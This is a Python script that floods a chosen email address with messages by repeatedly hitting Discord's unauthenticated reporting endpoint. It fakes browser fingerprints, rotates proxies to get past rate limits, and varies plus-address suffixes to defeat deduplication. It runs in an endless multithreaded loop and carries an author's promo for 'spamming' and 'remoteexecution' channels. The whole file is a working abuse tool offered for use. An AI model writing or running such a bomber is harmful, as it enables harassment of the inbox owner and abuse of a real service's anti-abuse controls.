import os
try:
    import curl_cffi
    from concurrent.futures import ThreadPoolExecutor
    import random
    import uuid
    import secrets
    import time
except Exception as e:
    print(e)
    print('Error on init, trying to fix')
    os.system('pip install curl_cffi')
    os.system('pip install curl-cffi')
    input('Run the script again should work now!')
    os.exit()



print('NO SUPPORT FOR THIS TOOL IF YOU COME TO MY DISCORD SERVER AND ASK FOR HELP I WILL NOT ANSWER AND CLOSE UR TICKET')
print('Found by r3ci | discord.gg/spamming | t.me/remoteexecution')
email = input('full email eg. bob@gmail.com: ')
threads = 100
epart1 = email.split('@')[0]
epart2 = email.split('@')[1]

useproxies = input('use proxies? (NO PROXIES = SLOWER) (y/n): ')

if useproxies == 'y':
    try:
        plist = open('proxies.txt', 'r').read().splitlines()
        if plist == ['user:pass@ip:port']:  
            print('No proxies found in proxies.txt, did u forget to save the file?')
            useproxies = False
        else:
            useproxies = True
    except FileNotFoundError:
        with open('proxies.txt', 'w') as f:
            f.write('user:pass@ip:port')
        useproxies = False
else:
    useproxies = False
    plist = []

s = curl_cffi.Session(impersonate='chrome136')

def fetchfinger():
    idpart = ''.join(str(random.randint(0,9)) for _ in range(18))
    def seg(n): return secrets.token_urlsafe(n)[:n]
    return f'{idpart}.{seg(22)}.{seg(27)}'

class bomber:
    def __init__(self):
        self.s = curl_cffi.Session(impersonate='chrome136')
        if useproxies:
            proxy = random.choice(plist)
            fullproxy = f'http://{proxy}'
            s.proxies = {
                'http': fullproxy,
                'https': fullproxy
            }
        s.headers.update({
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'en-US,en;q=0.5',
            'content-type': 'application/json',
            'origin': 'https://discord.com',
            'priority': 'u=1, i',
            'referer': 'https://discord.com/report',
            'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
            'x-debug-options': 'bugReporterEnabled',
            'x-discord-locale': 'en-US',
            'x-discord-timezone': 'Europe/Warsaw',
            'x-fingerprint': None
        })
        self.setcookie()

    def setcookie(self):
        s.cookies.update(self.s.get('https://discord.com/').cookies)

    def send(self, email):
        if useproxies:
            proxy = random.choice(plist)
            fullproxy = f'http://{proxy}'
            s.proxies = {
                'http': fullproxy,
                'https': fullproxy
            }

        s.headers['x-fingerprint'] = fetchfinger()
        r = s.post(
            'https://discord.com/api/v9/reporting/unauthenticated/message_urf/code',
            json={
                'name': random.choice(['message_urf', 'user_urf', 'guild_urf']),
                'email': email
            }
        )

        if r.status_code == 200:
            print(f'Sent email with stacking bypassed')

        elif r.status_code == 429:
            ratelimit = r.json().get('retry_after', 1.5)
            print(f'IP Is ratelimited! time -> {ratelimit} | Use rotating proxies to get around this if you see this while using proxies they are sticky/static get ROTATING proxies')

        else:
            print(f'Failed to send ({r.text})')

        
        if not useproxies:
            time.sleep(5)

with ThreadPoolExecutor() as ex:
    for _ in range(threads):
        while True:
            ex.submit(bomber().send, f'{epart1}+{''.join(str(random.randint(0, 9)) for _ in range(6))}@{epart2}')
